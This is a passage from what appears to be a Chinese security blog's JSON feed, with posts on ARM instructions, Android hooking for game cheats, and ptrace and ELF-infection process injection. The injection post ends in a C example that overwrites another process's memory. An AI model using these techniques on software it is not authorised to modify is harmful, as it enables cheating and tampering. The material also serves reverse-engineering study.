keyword\">var</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>methods<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>methods<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">onComplete</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5YzM1NDUvYXJ0aWNsZS9kZXRhaWxzLzExNDYyOTcxOA==\">https://blog.csdn.net/zyc3545/article/details/114629718</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5YzM1NDUvYXJ0aWNsZS9kZXRhaWxzLzExNDA4MDIyMD9vcHNfcmVxdWVzdF9taXNjPSUyNTdCJTI1MjJyZXF1ZXN0JTI1NUZpZCUyNTIyJTI1M0ElMjUyMjE2OTY0Mjg1MjMxNjgwMDIyNjU3NjUxMiUyNTIyJTI1MkMlMjUyMnNjbSUyNTIyJTI1M0ElMjUyMjIwMTQwNzEzLjEzMDEwMjMzNC5wYyUyNTVGYmxvZy4lMjUyMiUyNTdEJnJlcXVlc3RfaWQ9MTY5NjQyODUyMzE2ODAwMjI2NTc2NTEyJmJpel9pZD0wJnV0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YmxvZ35maXJzdF9yYW5rX2VjcG1fdjF+cmFua192MzFfZWNwbS0yLTExNDA4MDIyMC1udWxsLW51bGwubm9uZWNhc2UmdXRtX3Rlcm09ZnJpZGEmc3BtPTEwMTguMjIyNi4zMDAxLjQ0NTA=\">https://blog.csdn.net/zyc3545/article/details/114080220?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169642852316800226576512%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=169642852316800226576512&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-114080220-null-null.nonecase&amp;utm_term=frida&amp;spm=1018.2226.3001.4450</span>\t</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8yNDc1Y2I0NTMyYzg=\">https://www.jianshu.com/p/2475cb4532c8</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ExOTIxMDk4MDI3L2FydGljbGUvZGV0YWlscy8xMjcwNjIyMjk=\">https://blog.csdn.net/q1921098027/article/details/127062229</span></p>\n",
            "tags": [
                "Hook"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/03/arm-base/",
            "url": "https://alazymechnaic.github.io/2023/10/03/arm-base/",
            "title": "Arm_Base",
            "date_published": "2023-10-03T06:28:56.000Z",
            "content_html": "<h2 id=\"ARM\"><a href=\"#ARM\" class=\"headerlink\" title=\"ARM\"></a>ARM</h2><p>​\t本文用于介绍arm指令集的基本架构，特性。</p>\n<h3 id=\"寄存器用法\"><a href=\"#寄存器用法\" class=\"headerlink\" title=\"寄存器用法\"></a>寄存器用法</h3><pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">通用寄存器（General-Purpose Registers）：\n\nr0~r3 主要用于子程序间传递参数\n\nr4~r11 主要用于保存局部变量，但在 Thumb 程序中，通常只能使用 r4~r7 来保存局部变量\n\nr12 用作子程序间scratch 寄存器，即 ip 寄存器\n\nr13 通常用做栈指针，即 sp\n\nr14 寄存器又被称为连接寄存器（lr），用于保存子程序以及中断的返回地址\n\nr15 用作程序计数器（pc），由于 ARM 采用了流水线机制，当正确读取了 PC 的值后，该值为当前指令地址加 8 个字节，即 PC 指向当前指令的下两条指令地址。\n\nCPSR和SPSR都是程序状态寄存器，其中SPSR是用来保存中断前的CPSR中的值，以便在中断返回之后恢复处理器程序状态<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"基本指令\"><a href=\"#基本指令\" class=\"headerlink\" title=\"基本指令\"></a>基本指令</h3><h3 id=\"常用指令集\"><a href=\"#常用指令集\" class=\"headerlink\" title=\"常用指令集\"></a>常用指令集</h3><p>ARM中的立即数常用井号在前进行标注，#立即数</p>\n<h4 id=\"数据定义\"><a href=\"#数据定义\" class=\"headerlink\" title=\"数据定义\"></a>数据定义</h4><pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">DATA1 DCB 10,20,30,40 ;分配一片连续的字节存储单元并初始化\nDATA2 DCD 10,20,30,40 ;分配一片连续的字存储单元并初始化\nBUF SPACE 100 ;给BUF分配100字节的存储单元并初始化为0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"局部符号\"><a href=\"#局部符号\" class=\"headerlink\" title=\"局部符号\"></a>局部符号</h4><pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">引用格式：%{F|B|A|T} N{routname}\n%: 引用符号，对一个局部标号产生引用。\nF：指示编译器只向前搜索。B：指示编译器只向后搜索\nA：指示编译器搜索宏的所有宏命令层。T：指示编译器搜索宏的当前层\nN：局部标号的名字。routename：局部标号的作用范围名称，使用ROUT定义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"赋值操作\"><a href=\"#赋值操作\" class=\"headerlink\" title=\"赋值操作\"></a>赋值操作</h4><pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">a SETA 10 ;给算术变量a赋值为10\na SETL 10 ;给逻辑变量a赋值为10\na SETS “ss” ;给字符串变量a赋值为“ss”<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"加载操作\"><a href=\"#加载操作\" class=\"headerlink\" title=\"加载操作\"></a>加载操作</h3><pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">LDR R1,[R0,#0x12] ;将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变)\n\nLDR R1,[R0,#-0x12];将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变)\n\nLDR R1,[R0] ;将R0 地址处的数据读出，保存到R1 中(零偏移)\n\n(2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下：\n\nLDR R1,[R0,R2] ;将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变)\n\nLDR R1,[R0,-R2] ;将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变)\n\n(3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：\n\nLDR R1,[R0,R2,LSL #2] ;将R0+R2*4地址处的数据读出，保存到R1中（R0，R2的值不变）\n\nLDR R1,[R0,-R2,LSL #2];将R0-R2*4地址处的数据计读出，保存到R1中(R0，R2的值不变)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>STR指令以此类推</p>\n<h3 id=\"跳转指令\"><a href=\"#跳转指令\" class=\"headerlink\" title=\"跳转指令\"></a>跳转指令</h3><ul>\n<li><strong>强制跳转指令</strong>：B 目标地址</li>\n</ul>\n<pre class=\"line-numbers language-assemblu\" data-language=\"assemblu\"><code class=\"language-assemblu\">B（Branch）：无条件分支指令，用于无条件跳转到目标地址。\n\n示例：B label，跳转到标签为 \"label\" 的位置。\nBL（Branch with Link）：带链接的分支指令，用于跳转到目标地址，并将返回地址保存在链接寄存器（LR）中。\n\n示例：BL subroutine，跳转到子程序 \"subroutine\" 并保存返回地址。\nBX（Branch and Exchange）：分支并切换指令，用于根据寄存器的值跳转到不同的地址，并切换到新的执行状态。\n\n示例：BX Rn，根据寄存器 Rn 的值跳转到相应的地址。\nBLX（Branch with Link and Exchange）：带链接的分支并切换指令，结合了 BL 和 BX 的功能，用于跳转到目标地址，并将返回地址保存在链接寄存器（LR）中，并切换到新的执行状态。\n\n示例：BLX Rn，根据寄存器 Rn 的值跳转到相应的地址，并保存返回地址。\nCMP/BGT/BLT/BGE/BLE（Compare and Branch）：比较和分支指令，用于将两个操作数进行比较，并根据比较结果条件跳转到相应的地址。\n\n示例：CMP Rn, Rm，比较寄存器 Rn 和 Rm 的值。\nBGT label，如果 Rn 大于 Rm，则跳转到标签为 \"label\" 的位置。\nCBZ/CMN（Compare and Branch Zero/Non-zero）：比较并根据零/非零跳转指令，用于比较寄存器的值，并根据比较结果是否为零进行条件跳转。\n\n示例：CBZ Rn, label，如果 Rn 的值为零，则跳转到标签为 \"label\" 的位置<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"函数调用过程\"><a href=\"#函数调用过程\" class=\"headerlink\" title=\"函数调用过程\"></a>函数调用过程</h3><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZyYW5rX3p5cC9hcnRpY2xlL2RldGFpbHMvODgyMDIzNDc=\">https://blog.csdn.net/frank_zyp/article/details/88202347</span></p>\n",
            "tags": [
                "arm"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/02/androidhook/",
            "url": "https://alazymechnaic.github.io/2023/10/02/androidhook/",
            "title": "AndroidHook",
            "date_published": "2023-10-02T13:20:06.000Z",
            "content_html": "<h1 id=\"移动安全开发\"><a href=\"#移动安全开发\" class=\"headerlink\" title=\"移动安全开发\"></a>移动安全开发</h1><hr>\n<h2 id=\"定制化外挂的开发流程\"><a href=\"#定制化外挂的开发流程\" class=\"headerlink\" title=\"定制化外挂的开发流程\"></a>定制化外挂的开发流程</h2><ul>\n<li>逆向分析游戏逻辑</li>\n<li>验证外挂功能可行性：程序中可能存在对数据的校验，导致外挂不可行。</li>\n<li>注入游戏进程：获得root，使用ptrace方式注入游戏进程。</li>\n<li>枚举游戏进程模块信息：游戏进程在运行过程中会加载许多模块，定制化外挂需要获取游戏主逻辑模块的基地址，在Android中可以读取/proc/$pid/maps文件获取游戏进程中当前加载的所有模块名称、基址、权限等信息。<ul>\n<li>Hook游戏关键函数</li>\n<li>游戏内存数据修改</li>\n</ul>\n</li>\n<li>实现外挂功能</li>\n</ul>\n<h2 id=\"Hook技术实现\"><a href=\"#Hook技术实现\" class=\"headerlink\" title=\"Hook技术实现\"></a>Hook技术实现</h2><p>​\thook的前提是已经注入到目标进程后。hook的目的是在关键函数的执行前，执行预先设置的钩子函数，从而达到监控函数调用、改变函数功能的目的。</p>\n<h3 id=\"hook分类\"><a href=\"#hook分类\" class=\"headerlink\" title=\"hook分类\"></a>hook分类</h3><ul>\n<li>native hook: <ul>\n<li>基于汇编代码替换的hook技术：<ul>\n<li>异常hook</li>\n<li>inline hook</li>\n</ul>\n</li>\n<li>函数地址替换：<ul>\n<li>导入表hook</li>\n<li>虚表hook</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"inline-hook\"><a href=\"#inline-hook\" class=\"headerlink\" title=\"inline hook\"></a>inline hook</h3><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310031445483.png\" alt=\"image-20231003144538379\"></p>\n<p>使用inline hook的流程并不复杂，而是保持原先的指令替换原则，将某条指令替换为跳转指令，将其指向插入的底层桩函数，在其中保存上下文，并实现自定义的函数调用，最后还原上下文后并继续向下执行。这里注意，ARM架构下插入跳转指令时，由于指令长度限制，没有办法进行直接寻址，可以采用将地址保存在寄存器中，进行寄存器间接寻址的方式。</p>\n<h3 id=\"导入表hook\"><a href=\"#导入表hook\" class=\"headerlink\" title=\"导入表hook\"></a>导入表hook</h3><h3 id=\"基于异常的hook\"><a href=\"#基于异常的hook\" class=\"headerlink\" title=\"基于异常的hook\"></a>基于异常的hook</h3><p>采用的方法是signal + 非法指令的方式，在想要hook的地方触发异常，并捕获。在异常处理函数中捕获上下文的异常信息。</p>\n<ul>\n<li>首先对目标地址写入异常指令，同时注册异常处理函数来获取执行时机。</li>\n<li>当目标地址触发异常时，需要恢复目标地址的异常指令，同时设置目标地址的下一条指令为异常指令</li>\n<li>当目标地址的下一条指令触发异常时，需要将目标地址的正常指令篡改为异常指令，从而获取下次异常Hook的执行时机。</li>\n</ul>\n<h2 id=\"遍历游戏模块\"><a href=\"#遍历游戏模块\" class=\"headerlink\" title=\"遍历游戏模块\"></a>遍历游戏模块</h2><h3 id=\"基于maps、smaps实现的文件遍历模块\"><a href=\"#基于maps、smaps实现的文件遍历模块\" class=\"headerlink\" title=\"基于maps、smaps实现的文件遍历模块\"></a>基于maps、smaps实现的文件遍历模块</h3><p>​\t进程的内存模块信息存放在proc文件系统下，以pid为目录名称的maps文件，其中存放了每个进程的内存布局，注意这里要有root权限。</p>\n<h3 id=\"基于map-files目录实现的模块遍历\"><a href=\"#基于map-files目录实现的模块遍历\" class=\"headerlink\" title=\"基于map_files目录实现的模块遍历\"></a>基于map_files目录实现的模块遍历</h3><p>​\t在proc/pid/map_files文件夹中的软连接进行查看，</p>\n<h3 id=\"基于dl-iterate-phdr函数遍历模块\"><a href=\"#基于dl-iterate-phdr函数遍历模块\" class=\"headerlink\" title=\"基于dl_iterate_phdr函数遍历模块\"></a>基于dl_iterate_phdr函数遍历模块</h3><p>​\t该函数能够列出进程中的共享模块，可以得到模块的路径和地址。</p>\n<h3 id=\"dladdr函数获取指定模块的基址\"><a href=\"#dladdr函数获取指定模块的基址\" class=\"headerlink\" title=\"dladdr函数获取指定模块的基址\"></a>dladdr函数获取指定模块的基址</h3>",
            "tags": [
                "Android"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/02/processinject/",
            "url": "https://alazymechnaic.github.io/2023/10/02/processinject/",
            "title": "ProcessInject",
            "date_published": "2023-10-02T13:05:07.000Z",
            "content_html": "<h2 id=\"PC-端注入\"><a href=\"#PC-端注入\" class=\"headerlink\" title=\"PC 端注入\"></a>PC 端注入</h2><h2 id=\"移动端注入\"><a href=\"#移动端注入\" class=\"headerlink\" title=\"移动端注入\"></a>移动端注入</h2><p>​\t由于程序本身是存在进程隔离的，导致一个程序本身是不能影响其他程序的执行的。但是注入技术的初衷是热补丁，调试器功能的实现。因此只要有debug API存在就是可以注入的。</p>\n<h3 id=\"Zygote-注入\"><a href=\"#Zygote-注入\" class=\"headerlink\" title=\"Zygote 注入\"></a>Zygote 注入</h3><h3 id=\"ptrace注入\"><a href=\"#ptrace注入\" class=\"headerlink\" title=\"ptrace注入\"></a>ptrace注入</h3><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hwOTEwMzE1L2FydGljbGUvZGV0YWlscy83NzMzNTA1OA==\">https://blog.csdn.net/hp910315/article/details/77335058</span></p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">long</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">enum</span> <span class=\"token class-name\">__ptrace_request</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">pid_t</span> pid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>​\t其中request参数是本次ptrace要进行的操作，pid则是本次要附加的进程id，addr与data按照操作不同取不同的含义。request常见的选项如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">PTRACE_ATTACH，表示附加到指定远程进程;\nPTRACE_DETACH，表示从指定远程进程分离\nPTRACE_GETREGS，表示读取远程进程当前寄存器环境\nPTRACE_SETREGS，表示设置远程进程的寄存器环境\nPTRACE_CONT，表示使远程进程继续运行\nPTRACE_PEEKTEXT，从远程进程指定内存地址读取一个word大小的数据\nPTRACE_POKETEXT，往远程进程指定内存地址写入一个word大小的数据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<ul>\n<li>利用ptrace函数将shellcode注入远程进程的内存空间中，然后通过执行shellcode加载远程进程so模块。</li>\n<li>通过直接远程调用dlopen， dlsym， dlclose等函数加载被注入的so模块并执行指定代码</li>\n</ul>\n<h4 id=\"注入流程\"><a href=\"#注入流程\" class=\"headerlink\" title=\"注入流程\"></a>注入流程</h4><ol>\n<li>通过利用ptrace进行附加到要注入的进程；父进程可用waitpid来判断子进程是否中断。</li>\n<li>保存寄存环境；</li>\n<li>远程调用mmap函数分配内存空间；</li>\n<li>向远程进程内存空间写入加载模块名称和函数名称；</li>\n<li>远程调用dlopen函数打开注入模块；</li>\n<li>远程调用dlsym函数或需要调用的函数地址；</li>\n<li>远程调用被注入模块的函数；<ol>\n<li>前四个按顺序分别写入R0至R3，</li>\n<li>修改pc寄存器到要执行的函数地址，</li>\n<li>若为<strong>Thumb</strong>指令，则最低位要重新设置为0，并将CPSR寄存器的T标志位设置为1.若为ARM指令则CPSR的T标志位复位。</li>\n<li>设置远程进程的LR寄存器的值为0，远程进程的函数调用结束后，程序会跳转到LR寄存器存储的地址，但由于LR设置为0则会导致远程进程执行出错，此时会进入暂停状态，被Tracer接管，通过读取远程进程R0的寄存器可以获取远程函数调用的返回结果。</li>\n</ol>\n</li>\n<li>恢复寄存器环境；在detach之前恢复，保证程序原本的执行流程不崩溃。</li>\n<li>利用ptrace从远程进程剥离（detach）</li>\n</ol>\n<p>​\tshellcode注入就是通过将dlopen/dlsym库函数的操作放在shellcode代码中，注入函数只是通过对远程APP进程进行内存空间申请，接着修改shellcode 代码中有关dlopen、dlsymdlclose等函数使用到的参数信息，然后将shellcode代码注入到远程APP进程申请的空间中，最后通过修改PC寄存器的方式来执行shellcode 的代码</p>\n<h3 id=\"ELF文件感染注入\"><a href=\"#ELF文件感染注入\" class=\"headerlink\" title=\"ELF文件感染注入\"></a>ELF文件感染注入</h3><p>​\t在android平台Native层的可执行文件SO文件，它是属于ELF文件格式，通过修改ELF文件格式可以实现对so文件的注入。</p>\n<p>通过修改ELF二进制的可执行文件，并在ELF文件中添加自己的代码，使得可执行文件在运行时会先执行自定义添加的代码，最后在执行ELF文件的原始逻辑。</p>\n<p><strong>修改ELF文件的注入实现过程</strong></p>\n<p>​\t1.修改.dynamic段，在DT_STRTAB指向的字符串表中添加 自定义的so模块名称。由于直接在原字符串表中添加一串数据，会将字符串表后的所有数据的文件偏移发生变化，所以通常会将字符串表移至文件末尾。</p>\n<p>​\t2.通过修改Program Header Table中添加PT_LOAD表项，新添加的表项将保护so模块名称的字符串表数据映射到内存中。同时将Program Header Table移动到文件末尾；</p>\n<p>​\t3.修改.dynamic段的数组数据，修改DT_STRTAB,DT_STRSZ使其指向新字符串表，然后在dynamic arry的结尾加上DT_NEEDED表项，并指向自定义的so模块名称；</p>\n<p>​\t4.修改ELF HEADER结构中 Program Header Table的位置信息，并指向新的Program Header Table。</p>\n<h3 id=\"移动端注入实战\"><a href=\"#移动端注入实战\" class=\"headerlink\" title=\"移动端注入实战\"></a>移动端注入实战</h3><h4 id=\"Android-NDK注入环境配置\"><a href=\"#Android-NDK注入环境配置\" class=\"headerlink\" title=\"Android NDK注入环境配置\"></a>Android NDK注入环境配置</h4><p>​\t这里介绍在在Android环境下运行ELF文件所需要配置的NDK操作，关于frida hook的部分请参考另一篇博客<a href=\"\">frida-hook</a>。本文将环境配置在Ubuntu 20.04环境之上。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 下载NDK配置文件，这里需要科学上网一下</span>\n<span class=\"token function\">wget</span> https://dl.google.com/android/repository/android-ndk-r17-beta2-linux-x86_64.zip\n<span class=\"token comment\"># 解压</span>\n<span class=\"token function\">unzip</span> android-ndk-r17-beta2-linux-x86_64.zip\n<span class=\"token comment\"># 转移目录</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">mv</span> android-ndk-r17-beta2 /usr/local/\n<span class=\"token comment\"># 编辑环境配置，没有图形化界面就使用gedit</span>\n<span class=\"token function\">sudo</span> gedit /etc/profile<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>在profile中添加以下内容</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">export NDK=/usr/local/android-ndk-r17-beta2\nexport PATH=$PATH:$NDK\nexport NDK_ARM_GCC=/usr/local/android-ndk-r17-beta2/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gcc\nexport HO_ARM=\"--sysroot=/usr/local/android-ndk-r17-beta2/platforms/android-21/arch-arm -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include  -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include/arm-linux-androideabi\"\nexport NDK_x86_64_GCC=/usr/local/android-ndk-r17-beta2/toolchains/x86_64-4.9/prebuilt/linux-x86_64/bin/x86_64-linux-android-gcc\nexport HO_x86_64=\"--sysroot=/usr/local/android-ndk-r17-beta2/platforms/android-21/arch-x86_64 -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include  -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include/x86_64-linux-android\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用指令验证下，有如下显示说明配置成功：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token builtin class-name\">source</span> /etc/profile\n$ ndk-build <span class=\"token parameter variable\">-v</span>\nGNU Make <span class=\"token number\">3.81</span>\nCopyright <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span> <span class=\"token number\">2006</span>  Free Software Foundation, Inc.\nThis is <span class=\"token function\">free</span> software<span class=\"token punctuation\">;</span> see the <span class=\"token builtin class-name\">source</span> <span class=\"token keyword\">for</span> copying conditions.\nThere is NO warranty<span class=\"token punctuation\">;</span> not even <span class=\"token keyword\">for</span> MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\n\nThis program built <span class=\"token keyword\">for</span> x86_64-pc-linux-gnu<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里自己定义了编译工具和编译环境：</p>\n<ul>\n<li><p><strong>ARM*编译</strong>：</p>\n<ul>\n<li>```sh<br>$NDK_ARM_GCC $HO_ARM -pie ./main.c -o main<br>$NDK_ARM_GCC $HO_ARM -shared -fPIC test.c -o libTest.so # 动态链接库编译<pre class=\"line-numbers language-none\"><code class=\"language-none\">\n- **X86_64编译**：\n\n  - ```sh\n    $NDK_x86_64_GCC $HO_x86_64 -static ./main.c -o main_x86_64 \n    # 这里要加上static参数，否则程序会报错：error: Android 5.0 and later only support position-independent executables (-fPIE).<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<p>这里的编译选项和一般gcc差异不大，但要注意运行的目标安卓机器是x86还是arm。将编译好的程序使用adb push到目标机器上，后续可以进行愉快的注入编程了。</p>\n</li>\n</ul>\n<h4 id=\"编程实现ptrace注入\"><a href=\"#编程实现ptrace注入\" class=\"headerlink\" title=\"编程实现ptrace注入\"></a>编程实现ptrace注入</h4><p><strong>Attach模式</strong></p>\n<p>​\t一般的attach模式的注入较为容易，找到pid和要修改的内存地址，直接修改即可，ptrace提供了强大的API。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/ptrace.h&gt;</span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ptrace\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> pid <span class=\"token operator\">=</span> <span class=\"token number\">2994</span><span class=\"token punctuation\">;</span>\t\n\t<span class=\"token keyword\">long</span> val <span class=\"token operator\">=</span> <span class=\"token number\">1633771873</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> base_so_addr <span class=\"token operator\">=</span> <span class=\"token number\">0xd7d83000</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> string_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x028334</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> address <span class=\"token operator\">=</span> base_so_addr <span class=\"token operator\">+</span> string_addr<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> ret <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_ATTACH<span class=\"token punctuation\">,</span>pid<span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PTRACE_ATTACH:%d\\n\"</span><span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">// 查找相应的数据</span>\n\tret <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_PEEKDATA<span class=\"token punctuation\">,</span>pid<span class=\"token punctuation\">,</span>address<span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PTRACE_PEEKDATA:%x\\n\"</span><span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">// 修改数据</span>\n\tret <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_POKEDATA<span class=\"token punctuation\">,</span>pid<span class=\"token punctuation\">,</span>address<span class=\"token punctuation\">,</span>val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sub  PTRACE_PEEKDATA:%x\\n\"</span><span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">// 再次查看</span>\n\tret <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_PEEKDATA<span class=\"token punctuation\">,</span>pid<span class=\"token punctuation\">,</span>address<span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PTRACE_PEEKDATA:%x\\n\"</span><span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">// detach pid</span>\n\tret <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_DETACH<span class=\"token punctuation\">,</span>pid<span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token 